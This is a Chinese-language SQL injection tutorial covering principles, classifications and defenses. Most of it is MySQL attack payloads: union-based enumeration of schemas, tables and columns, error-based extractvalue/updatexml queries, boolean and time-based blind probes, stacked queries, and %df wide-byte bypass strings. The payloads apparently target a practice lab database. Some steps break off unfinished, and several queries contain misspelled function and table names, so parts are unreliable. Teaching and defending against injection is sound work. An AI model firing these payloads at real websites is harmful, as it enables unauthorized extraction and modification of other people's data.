## 一、sql注入原理：
攻击者构造的特殊SQL语句的内容传到web应用，没有经过过滤或者严格的过滤，被带入到了数据库中进行执行，导致获取或者修改数据库中的数据。</br>
## 二、sql注入漏洞关键条件：
（1）用户能控制输入内容；</br>
（2）web应用没有严格过滤输入的内容，将其带入到数据库执行</br>
## 三、sql注入的分类：
（1）按照数据库分类：MySQL数据库注入、sqlserver数据库注入、access数据库注入、Oracle数据库注入、nosql注入;</br>
（2）按照语句划分：select，update，insert，delete，limit之后的注入，order by之后的注入；</br>
（3）按照位置划分：get，post，http header(cookie,referrer,user-agent等)；</br>
（4）按照SQL注入点反馈类型分类：union类型，基于错误显示，布尔类型，基于时间，其他类型；</br>
（5）其他类型：base64注入，二次编码注入，宽字节注入，OOB-dns外带注入</br>
## 四、sql注入的防御方法：
（1）定制黑名单：将常用的SQL注入字符写入到黑名单中，然后通过程序对用户提交的POST、GET请求以及请求中的各个字段都进行过滤检查，筛选威胁字符。</br>
（2）限制查询长度：由于SQL注入过程中需要构造较长的SQL语句，因此，一些特定的程序可以使用限制用户提交的请求内容的长度来达到防御SQL注入的目的，但这种效果并不好。</br>
（3）限制查询类型：限制用户请求内容中每个字段的类型，并在用户提交请求的时候进行检查，凡不符合该类型的提交就认为是非法请求。</br>
（4）白名单法：该方法只对部分程序有效，对一些请求内容相对固定的程序，可以制定请求内容的白名单，如：某程序接受的请求只有数字，且数字为1至100，这样可以检查程序接受的请求内容是否匹配，如果不匹配，则认为是非法请求。</br>
（5）设置数据库权限：根据程序要求为特定的表设置特定的权限，如：某段程序对某表只需具备select权限即可，这样即使程序存在问题，恶意用户也无法对表进行update或insert等写入操作。</br>
（6）限制目录权限：WEB目录应至少遵循“可写目录不可执行，可执行目录不可写”的原则，在此基础上，对各目录进行必要的权限细化。</br>
## 五、重点谈一谈MySQL注入：
### 1、联合注入：
***（1）判断是否有注入及注入点的类型***
```
是否有注入：加单引号，and 111=111，and ’1’=’1’，and 1=2，or 1=1，or 1=2</br>
注入点类型：字符型（’，”，’），”)，%’），数字型</br>
```
***（2）判断查询列数（order by）***
原理order by 是排序的语句：</br>
```SQL
select * from users order by id
select * from users order by id desc
select * from users order by 1
```
***（3）联合查询***
```
id=1’ union select 1,2,3--+
id=-1’ union select 1,2,3--+
```
***（4）获取基本信息***
```
version()  数据库版本
database()  当前网站使用的数据库
user()  当前网站使用的数据库账户
@@secure_file_priv         数据库的读写文件
@@datadir  数据库安装目录：phpstudy（c:\phpstudy\mysql;c:\phpstudy\www）、wamp（c:\wamp\mysql;c:\wamp\www）
```
***（5）获取数据库名***
information_schema数据库（schemata表、tables表、columns表）；
schemata表里面获取数据库名：
```
select schema_name from schemata;
id=1' union select 1,2,group_concat(schema_name) from information_schema.schemata
```
***（6）获取表名（tables表）***
```
select table_name from tables where table_schema='security';
select table_name from tables where table_schema=database();
id=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
```
***（7）获取列名（columns表）***
```
select column_name from columns where table_schema='security' and table_name='users';
```
***（8）优化步骤***
```
select table_name,column_name from columns where table_schema='security';
id=1' union select 1,2,group_concat(table_name,'_',column_name) from information_schema.columns where table_schema=database()
```
***（9）获取数据***
```
  --dump</br>
```
### 2、报错注入：
报错注入语句(本查询结果基于数据库security下的表) （updatexml/ extractvalue）</br>
1#查询数据库名字（用户user()；版本version()）</br>
```
?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))%23</br>
```
2#查询数据库有多少个表</br>
```
?id=1' and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e))%2
```
3#查询数据库的表名，limit后面第一个数字表示第几个表</br>
```
?id=1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))%23
```
4#查询列名，limit后数字表示第几列</br>
```
?id=1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e))%23
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='emails'),0x7e))%23
```
5#查询表里面某列的内容</br>
```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(id) from security.emails),0x7e))%23    
```
1#查询数据库名字，数据库名字为security（用户user()；版本version()）</br>
```
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23
```
2#查询数据库有多少个表</br>
```
?id=1' and updatexml(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
```
3#查询数据库的表名，limit后第一个数字表示第几个表</br>
```
?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)%23
```
4#查询列名，limit后数字表示第几列</br>
```
?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e),1)%23
```
5#查询表里面某列的内容</br>
```
?id=1' and updatexml(1,concat(0x7e,(select group_concat(email_id) from security.emails),0x7e),1)%23</br>
```
### 3、布尔盲注：</br>
1#获得数据库名长度为8</br>
```
?id=1' and (length(database())=8)%23           #有回显
```
2#获得数据库名</br>
```
?id=1' and ascii(substr(database(),1,1))<100 %23             #无回显
?id=1' and ascii(substr(database(),1,1))=115 %23             #有回显
```
3#获得数据库表名个数</br>
```
?id=1' and (select count(*) from information_schema.tables where table_schema=database())=4%23         #有回显
```
4#获得数据库表名长度</br>
```
?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6%23 
```
5#获得数据库表名</br>
```
?id=1' and ascii((substr ((select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1)))=106%23
```
6#获取列名</br>
 </br>
7#获得数据            </br>              
 </br>
### 4、时间盲注：</br>
1#获得数据库名长度</br>
```
?id=1' and if((length(database())>5),sleep(5),1)%23        #有时间延迟，说明判断正确
?id=1' and if((length(database())>9),sleep(5),1)%23        #无时间延迟，说明判断错误
?id=1' and if((length(database())>5),1,sleep(5))%23        #无时间延迟，说明判断正确
```
2#获得数据库名</br>
```
?id=1' and if((ascii(substr(database(),1,1))>100,sleep(5),1))%23                 #有无回显
```
3#获得表名（同理先获取长度）</br>
```
?id=1' and if((asscii(substr((select table_name from information_schame.tables where table_schame=database() limit 0,1),1,1)))>100,sleep(5),1)            #有无回显
```
4#获取数据库列名（先拿列长度？）</br>
```
?id=1' and if
```
5#获取数据</br>
```
?id=1' and if
```
### 5、堆叠注入：
mysqli_query函数不支持堆叠注入，mysqli_muiti_query()支持堆叠注入。</br>
语法：select * from users;create table you(id int);#      </br>
id=1';create table you(id int);#</br>
### 6、内联注入：
子查询：select (select 1)</br>
### 7、宽字节注入：
在GBK编码格式的MySQL数据库中，针对敏感符号前添加斜杠这种过滤方式，利用两个字节构成一个汉字的原理，我们在敏感符号前加%81-%FE之间的URL编码，与斜杠/共同组成一个汉字，从而吃掉斜杠/绕过waf。</br>
虽然用%df能绕过id=1'部分的引号，但是如果后面SQL注入部分出现引号，比较难绕过。比如查询列名的时候，要用到table_name='email'，该语句引号前加%df会使表名出错，无法查询列名。</br>
解决方法：将表名和列名转换成十六进制，并且在十六进制之前加上0x即可。</br>
```
-1%df' union select 1,2,count(table_name) from information_schema.tables where table_schema=0x7365637572697479%23                 #联合注入，查询表数量
```
### 8、HTTP头注入：
大多数扫描器发现不了http头注入。</br>
原理：web程序代码中把用户提交的HTTP头信息未作过滤就直接带入到数据库中执行。</br>
造成漏洞原因：</br>
（1）在网站代码中相关HTTP中的字段与数据库有交互；</br>
（2）代码中使用了PHP超全局变量$_SERVER[]</br>
漏洞修复：</br>
（1）在设置HTTP响应头的代码中，过滤回车换行（%0d,%0a,%0D,%0A）字符</br>
（2）不采用有漏洞版本的apache服务器</br>
（3）的参数做合法性校验，以及长度限制，谨慎的根据用户所传入的参数做HTTP返回包的header设置。</br>
### 9、二次编码注入：</br>
注入原理：</br>
相关函数：urldecode()、rawurldecode()</br>
因为PHP中常用的防注入函数addslashes()，是给(‘)、(“)、(\)、NULL等特殊字符前面加上反斜杠以用于转义，但是这些函数遇到urldecode()、rawurldecode()函数时，会因为二次编码引发注入生成单引号，引发注入漏洞的产生；</br>
urldecode()函数是对已编码的URL进行解码，但是PHP会在处理提交的数据之前先进行一次解码，因此造成二次编码的注入。</br>
### 10、base64注入：</br>
原理：针对传递的参数被base64加密后的注入点进行注入，这种方式常用来绕过一些WAF的检测。</br>
### 11、二次注入：</br>
二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</br>
